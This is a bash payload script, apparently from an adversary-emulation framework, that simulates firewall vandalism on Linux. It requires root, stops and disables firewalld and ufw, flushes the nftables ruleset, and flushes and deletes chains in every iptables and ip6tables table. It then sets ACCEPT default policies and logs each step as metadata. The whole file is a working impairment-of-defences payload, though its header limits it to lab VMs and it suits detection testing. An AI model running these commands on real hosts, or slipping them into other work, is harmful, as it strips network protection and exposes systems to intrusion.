#!/usr/bin/env bash
#
# payloads/vandalism/firewall_disable/commands.sh
#
# Simulates firewall vandalism by disabling common firewall services, flushing
# nftables and iptables rules, and setting default ACCEPT policies.
#
# Intended only for local lab/VM environments under your control.

set -euo pipefail

if [[ -z "${FRAMEWORK_ROOT:-}" ]]; then
    echo "[x] FRAMEWORK_ROOT must be set" >&2
    exit 1
fi

source "$FRAMEWORK_ROOT/lib/log_utils.sh"
source "$FRAMEWORK_ROOT/lib/metadata_utils.sh"
source "$FRAMEWORK_ROOT/lib/privilege_utils.sh"

require_privilege

DISABLE_FIREWALLD="${DISABLE_FIREWALLD:-true}"
DISABLE_UFW="${DISABLE_UFW:-true}"
FLUSH_NFTABLES="${FLUSH_NFTABLES:-true}"
FLUSH_IPTABLES="${FLUSH_IPTABLES:-true}"
FLUSH_IP6TABLES="${FLUSH_IP6TABLES:-true}"
SET_ACCEPT_POLICIES="${SET_ACCEPT_POLICIES:-true}"

IPTABLES_TABLES="${IPTABLES_TABLES:-filter nat mangle raw security}"
IPTABLES_CHAINS="${IPTABLES_CHAINS:-INPUT FORWARD OUTPUT}"

run_best_effort() {
    local label="$1"
    local command_string="$2"

    log "$label"

    if run_priv "$command_string"; then
        record_metadata "firewall_action_success=$label"
    else
        warn "Firewall action failed: $label"
        record_metadata "firewall_action_failed=$label"
    fi
}

command_available() {
    local command_name="$1"
    command -v "$command_name" >/dev/null 2>&1
}

log "firewall_disable starting"
log "Execution user: $(whoami)"
log "Execution id: $(id)"

if [[ "$DISABLE_FIREWALLD" == "true" ]] && command_available firewall-cmd; then
    record_metadata "firewalld_present=true"
    run_best_effort "stop_firewalld" "systemctl stop firewalld"
    run_best_effort "disable_firewalld" "systemctl disable firewalld"
else
    record_metadata "firewalld_present=false"
fi

if [[ "$DISABLE_UFW" == "true" ]] && command_available ufw; then
    record_metadata "ufw_present=true"
    run_best_effort "disable_ufw" "ufw --force disable"
else
    record_metadata "ufw_present=false"
fi

if [[ "$FLUSH_NFTABLES" == "true" ]] && command_available nft; then
    record_metadata "nft_present=true"
    run_best_effort "flush_nftables" "nft flush ruleset"
else
    record_metadata "nft_present=false"
fi

if [[ "$FLUSH_IPTABLES" == "true" ]] && command_available iptables; then
    record_metadata "iptables_present=true"

    for table in $IPTABLES_TABLES; do
        run_best_effort "iptables_flush_${table}" "iptables -t '$table' -F || true"
        run_best_effort "iptables_delete_chains_${table}" "iptables -t '$table' -X || true"
    done

    if [[ "$SET_ACCEPT_POLICIES" == "true" ]]; then
        for chain in $IPTABLES_CHAINS; do
            run_best_effort "iptables_policy_${chain}_accept" "iptables -P '$chain' ACCEPT"
        done
    fi
else
    record_metadata "iptables_present=false"
fi

if [[ "$FLUSH_IP6TABLES" == "true" ]] && command_available ip6tables; then
    record_metadata "ip6tables_present=true"

    for table in $IPTABLES_TABLES; do
        run_best_effort "ip6tables_flush_${table}" "ip6tables -t '$table' -F || true"
        run_best_effort "ip6tables_delete_chains_${table}" "ip6tables -t '$table' -X || true"
    done

    if [[ "$SET_ACCEPT_POLICIES" == "true" ]]; then
        for chain in $IPTABLES_CHAINS; do
            run_best_effort "ip6tables_policy_${chain}_accept" "ip6tables -P '$chain' ACCEPT"
        done
    fi
else
    record_metadata "ip6tables_present=false"
fi

record_metadata "firewall_disable_success=true"

log "firewall_disable complete"
